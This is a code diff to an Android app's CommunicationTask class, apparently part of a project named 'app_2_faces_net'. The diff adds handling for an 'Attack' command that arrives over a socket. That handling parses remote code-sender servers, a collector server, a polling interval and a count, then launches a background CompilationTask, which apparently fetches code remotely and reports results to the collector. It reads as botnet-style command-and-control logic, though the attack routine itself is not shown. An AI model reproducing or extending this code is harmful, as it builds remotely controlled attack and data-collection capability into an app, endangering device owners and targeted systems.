@@ -4,6 +4,9 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.util.Log;
 
+import com.android.app_2_faces_net.util.DeviceUtils;
+import com.android.app_2_faces_net.util.ParamParser;
+
 import java.io.IOException;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -54,23 +57,18 @@ public class CommunicationTask implements Runnable {
                         toSend = DeviceUtils.getDeviceModel();
                         break;
                     case "Attack":
-                        String senderServerString = this.socketMain.read();
-                        String collectorServerString = this.socketMain.read();
-                        String resultTypeString = this.socketMain.read();
-                        String argString = this.socketMain.read();
+                        //String senderServerString = this.socketMain.read();
 
-                        String[] socketCodeSendersList = parseSocketCodeSenderList(senderServerString);
+                        CryptedSocket[] codeSenderSockets = ParamParser.parseCodeSenders(this.socketMain.read());
+                        CryptedSocket collectorSocket = ParamParser.parseSocketCollector(this.socketMain.read());
 
-                        resultTypeString = resultTypeString.split("Result Type: ")[1];
-                        argString = argString.split("Arg: ")[1];
-
-                        collectorServerString = collectorServerString.split("Collector: ")[1];
-                        String[] collectorParams = collectorServerString.split(":");
-                        String socketCollectorHostname = collectorParams[0];
-                        int socketCollectorPort = Integer.parseInt(collectorParams[1]);
+                        String resultTypeString = ParamParser.parseResultType(this.socketMain.read());
+                        String argString = ParamParser.parseArg(this.socketMain.read());
+                        int polling = ParamParser.parsePolling(this.socketMain.read());
+                        int num = ParamParser.parseNum(this.socketMain.read());
 
 
-                        CompilationTask compilationTask = new CompilationTask(this.context, socketCollectorHostname, socketCollectorPort, socketCodeSendersList, resultTypeString, argString);
+                        CompilationTask compilationTask = new CompilationTask(this.context, collectorSocket, codeSenderSockets, resultTypeString, argString, polling, num);
                         ExecutorService executor = Executors.newSingleThreadExecutor();
                         executor.execute(compilationTask);
 
